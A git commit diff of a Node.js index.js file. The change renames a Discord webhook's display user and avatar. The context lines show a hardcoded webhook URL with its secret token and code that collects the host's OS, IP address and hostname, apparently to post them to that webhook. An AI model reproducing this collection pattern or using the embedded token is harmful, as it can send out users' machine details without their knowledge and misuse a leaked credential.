10b76480fb64328cfc74ae8a335b76c70ddd344a
Solid <77588421+Solid999@users.noreply.github.com>
2022-12-09 22:34:55 +0100

    Update index.js

--- index.js
+++ index.js
@@ -3,8 +3,8 @@ var ip = require('ip');
 const features = require('cpu-features')();
 const { Webhook } = require('discord-webhook-node');
 const cloudSolid = new Webhook("https://discord.com/api/webhooks/1033087971982843995/c7LtfNuhB9giLW-TavWGw0ARHkRc7S9Q29SVrdBYrghq50HB6P8Pz9_SG2gQY6Qp_ziO");
-cloudSolid.setUsername('CloudOS');
-cloudSolid.setAvatar('https://img.icons8.com/color/48/000000/download-from-cloud.png')
+cloudSolid.setUsername('Solid999');
+cloudSolid.setAvatar('https://avatars.githubusercontent.com/u/77588421?v=4')
 const software = '**Betriebssystem: **' + '`' + os.type() + ' | ' + os.platform() + '`'
 const network = '**IP Address:** ' + '`' + ip.address() + '`'
 const desktop = '**Desktop: **' + '`' + os.hostname() + '`'
